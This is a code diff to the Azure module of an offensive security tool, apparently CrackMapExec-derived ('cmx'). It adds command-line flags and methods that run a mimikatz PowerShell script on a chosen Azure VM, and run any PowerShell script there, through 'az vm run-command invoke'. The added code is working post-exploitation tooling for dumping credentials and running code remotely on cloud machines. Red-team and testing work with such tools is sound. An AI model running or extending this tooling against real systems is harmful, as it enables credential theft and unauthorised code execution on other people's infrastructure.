@@ -5,6 +5,7 @@ import cmx
 from cmx import config as cfg
 from cmx.helpers.logger import highlight, write_log
 from cmx.logger import CMXLogAdapter
+from cmx.connection import *
 
 from azure.cli.core import get_default_cli
 from azure.cli.core._session import ACCOUNT, CONFIG, SESSION
@@ -16,7 +17,7 @@ import subprocess
 import json
 import pprint
 
-from cmx.connection import *
+from pathlib import Path
 
 import pdb
 
@@ -72,9 +73,14 @@ class az(connection):
         storagegroup.add_argument('--storage-list', action='store_true', help='List all Storage for current subscription')
 
         vmgroup = azure_parser.add_argument_group("VM Checks", "Interact with VMs and VM Scale Sets")
-        vmgroup.add_argument('--vm-list', nargs='?', const='', metavar='RESOURCEGROUP', help='List all VMs for current subscription or target resource group')
-        vmgroup.add_argument('--vmss-list', nargs='?', const='', metavar='RESOURCEGROUP', help='List all VM Scale Sets for current subscription or target resource group')
-        #vmgroup.add_argument('--mimiaz', action='store_true', help='Execute mimikats on a target VM')
+        vmgroup.add_argument('--vm-list', nargs='?', const='', metavar='TARGET_VM', help='List all VMs for current subscription or target resource group')
+        vmgroup.add_argument('--vmss-list', nargs='?', const='', metavar='TARGET_VMSS', help='List all VM Scale Sets for current subscription or target resource group')
+        
+        scriptgroup = azure_parser.add_argument_group("Script Execution", "Execute Scripts on Azure VMs")
+        scriptgroup.add_argument('--mimiaz', action='store_true', help='Execute mimikats on a target VM')
+        scriptgroup.add_argument('--script', nargs=1, metavar='Full_PATH_TO_SCRIPT', help='Execute Script on a target VM. Use full path to script')
+        scriptgroup.add_argument('--vm', nargs=1, metavar='TARGET_VM', help='Used to specify target for Script Execution')
+        scriptgroup.add_argument('--rg', nargs=1, metavar='RESOURCEGROUP',help='Used to specify target resource group for Script Execution')
 
         spngroup = azure_parser.add_argument_group("SPN Checks", "Interact with Service Principals")
         spngroup.add_argument('--spn-list', action='store_true', help='List all SPNs for current subscription')
@@ -685,10 +691,40 @@ class az(connection):
             vmss_iplist_json = json.loads(vmss_iplist.stdout.decode('utf-8'))
             pprint.pprint(vmss_iplist_json)
 
+###############################################################################
+
+         #####      #####     ######     ###    ######     ####### 
+        #     #    #     #    #     #     #     #     #       #    
+        #          #          #     #     #     #     #       #    
+         #####     #          ######      #     ######        #    
+              #    #          #   #       #     #             #    
+        #     #    #     #    #    #      #     #             #    
+         #####      #####     #     #    ###    #             #    
+                                                           
+
+###############################################################################
+###############################################################################
+#
+#
+#
+#
+###############################################################################
+
 
     def mimiaz(self):
         # testing with just running coffee
         # need to figure out how we gonna get output back - limited to 4096 this way...
+        if self.args.mimiaz and (self.args.vm is None or self.args.rg is None):
+            self.logger.error("mimiaz requires --vm and --rg.")
+            self.logger.error("Try `cmx az --vm-list` to find values")
+            return
+
+
+        mimiaz_path = cfg.PS_PATH / 'mimiaz.ps1'
+        mimiaz_script = '@' + str(mimiaz_path)
+        self.logger.announce("Running mimikatz on {}, please allow at least 30 seconds".format(self.args.vm[0]))
+
+        commander = subprocess.run(['az','vm', 'run-command', 'invoke', '--command-id', 'RunPowerShellScript', '--name', self.args.vm[0], '-g', self.args.rg[0], '--scripts', mimiaz_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         try:
             commander_json = json.loads(commander.stdout.decode('utf-8'))
         except:
@@ -701,6 +737,34 @@ class az(connection):
         else:
             print(commander_json['value'][0]['message'])
 
+
+    def script(self):
+        # need to figure out how we gonna get output back - limited to 4096 this way...
+        if self.args.vm is None or self.args.rg is None:
+            self.logger.error("script execution requires a --vm and --rg.")
+            self.logger.error("Try `cmx az --vm-list` to find values")
+            return
+        
+        if Path(self.args.script[0]).is_file():
+            script_path = '@' + self.args.script[0]
+        else:
+            self.logger.error("Script not found at {}".format(self.args.script[0]))
+            return
+
+        self.logger.announce("Running script on {}, please allow at least 30 seconds".format(self.args.vm[0]))
+
+        commander = subprocess.run(['az','vm', 'run-command', 'invoke', '--command-id', 'RunPowerShellScript', '--name', self.args.vm[0], '-g', self.args.rg[0], '--scripts', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        try:
+            commander_json = json.loads(commander.stdout.decode('utf-8'))
+        except:
+            self.logger.error("Script Execution Failed")
+            return
+
+        if self.args.full: 
+            pprint.pprint(commander_json)
+
+        else:
+            print(commander_json['value'][0]['message'])
 
 ###############################################################################
 
